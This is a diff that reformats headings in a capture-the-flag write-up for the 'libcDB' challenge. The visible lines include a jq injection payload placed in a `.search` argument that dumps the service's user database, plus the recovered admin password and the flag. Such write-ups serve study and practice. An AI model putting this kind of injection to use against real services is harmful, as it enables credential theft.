@@ -1,4 +1,4 @@
-### libcDB - 14 solves
+# libcDB - 14 solves
 
 Description:
 ```
@@ -11,6 +11,7 @@ nc libcdb.3k.ctf.to 7777
 * test account { Dead:pool }
 ```
 
+## First looks
 When connecting to the provided address, we are given a login prompt and we can enter the credentials from the description resulting in the following prompt:
 
 ```
@@ -51,7 +52,7 @@ The `.version` command gives us some information about what libc's are added to 
 "ubuntu_libc6-dbg_2.4-1ubuntu12_amd64"
 "ubuntu_libc6-i386_2.10.1-0ubuntu15_amd64"
 ```
-
+### Search
 
 The last feature, `.search` is more of interest and has the following pattern: `.search <*symbol> <*addr> <filter>`.  
 An example search is `.search fprintf 0x4b970` which gives us some nice information about the `fprintf` function:
@@ -113,4 +114,5 @@ Final Payload: `.search fprintf 0x4b970 ,{name:.[]|$maindb.users|tostring}`. Res
     }
 ]
 ```
-And so logging in with `admin:v3ryL0ngPwC4nTgu3SS0xfff`   we get the flag by the `.secret` command: `3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}`
+And so logging in with `admin:v3ryL0ngPwC4nTgu3SS0xfff`   we get the flag by the `.secret` command:  
+`3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}`
